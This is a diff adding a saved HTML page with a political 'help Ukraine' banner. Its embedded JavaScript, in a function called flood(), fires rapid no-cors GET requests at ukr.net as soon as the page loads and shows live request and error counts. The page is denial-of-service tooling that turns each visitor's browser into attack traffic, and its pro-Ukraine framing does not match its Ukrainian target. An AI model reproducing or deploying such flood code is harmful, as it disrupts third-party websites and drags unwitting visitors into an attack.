@@ -1,0 +1,76 @@
+
+
+<!-- saved from url=(0115)https://stop-russian-desinformation.near.page/?fbclid=IwAR3oGkmLuaiwsj3dVTICCsjmkrypcfv43S4ZluSWSMMUqeYZ0PlN94qrDyI -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>russia MUST BE STOPPED!</title>
+</head>
+<body data-new-gr-c-s-check-loaded="14.1050.0" data-gr-ext-installed="">
+  <h1>Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
+   <div id="stats"><table width="100%"></div>
+<script>
+
+var source = 'https://www.ukr.net'
+
+var target = {
+	number_of_requests: 0, number_of_errored_responses: 0
+}
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' 
+  + '<tr><td>' + source + '</td><td>' + target.number_of_requests + '</td><td>' + target.number_of_errored_responses + '</td></tr>' 
+  + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(options) {
+  const controller = new AbortController();
+  const id = 0 //setTimeout(() => controller.abort(), options.timeout);
+  return fetch(source, {
+    method: 'GET',
+	mode: 'no-cors',
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+	console.log(response)
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood() {
+
+  for (var i = 0;i < 10	; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
+    }
+    queue.push(
+      fetchWithTimeout({ timeout: 1000 })
+        .catch((error) => { 
+          if (error.code === 20 /* ABORT */) {
+            return;
+          }
+          target.number_of_errored_responses++;
+        })
+        .then((response) => {
+	      if (response && !response.ok) {
+            target.number_of_errored_responses++;
+          }
+          target.number_of_requests++;
+        })
+
+    )
+  }
+}
+
+// Start
+flood()
+</script>
+
+</body>
